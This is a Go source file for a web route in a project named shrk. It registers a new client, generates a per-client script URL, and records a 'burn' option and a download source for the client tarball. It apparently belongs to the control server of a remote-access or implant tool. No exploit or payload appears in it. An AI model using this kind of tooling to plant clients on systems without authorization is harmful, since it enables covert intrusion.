package routes

import (
	"fmt"
	"net/http"
	"net/url"
	"strings"

	"github.com/gofiber/fiber/v2"
	"github.com/ngn13/shrk/server/config"
	"github.com/ngn13/shrk/server/database"
	"github.com/ngn13/shrk/server/log"
	"github.com/ngn13/shrk/server/util"
)

func GET_new(c *fiber.Ctx) error {
	return util.Render(c, "new")
}

func POST_new(c *fiber.Ctx) error {
	var (
		err        error
		script_url string
		client     *database.Client
		conf       *config.Type
		db         *database.Type
	)

	db = c.Locals("database").(*database.Type)
	conf = c.Locals("config").(*config.Type)

	body := struct {
		Source     string `form:"source"`
		CustomURL  string `form:"custom"`
		ShouldBurn string `form:"burn"`
	}{}

	if err = c.BodyParser(&body); err != nil {
		return util.RenderErr(c, "invalid form data", http.StatusBadRequest)
	}

	if client, err = db.ClientAdd("", ""); err != nil {
		log.Fail("failed to add a client to the database: %s", err.Error())
		return util.RenderErr(c, "server error", http.StatusInternalServerError)
	}

	if script_url, err = url.JoinPath(conf.HTTP_URL, client.ScriptPath()); err != nil {
		log.Fail("failed create the script URL: %s", err.Error())
		return util.RenderErr(c, "server error", http.StatusInternalServerError)
	}

	client.ShouldBurn = "on" == body.ShouldBurn
	client.IsBurned = false

	switch body.Source {
	case "local":
		client.SourceURL = ""

	case "github":
		client.SourceURL = fmt.Sprintf("https://github.com/ngn13/shrk/releases/download/%s/shrk-client-%s.tar.gz", conf.Version, conf.Version)

	case "custom":
		if !strings.HasPrefix(body.CustomURL, "https://") && !strings.HasPrefix(body.CustomURL, "http://") {
			db.ClientDel(client.ID)
			return util.Render(c, "new", fiber.Map{
				"error": "invalid custom URL",
			})
		}
		client.SourceURL = body.CustomURL

	}

	if err = db.Save(); err != nil {
		log.Fail("failed to save the database: %s", err.Error())
		return util.RenderErr(c, "server error", http.StatusInternalServerError)
	}

	return util.Render(c, "new", fiber.Map{
		"script": script_url,
		"client": client,
	})
}
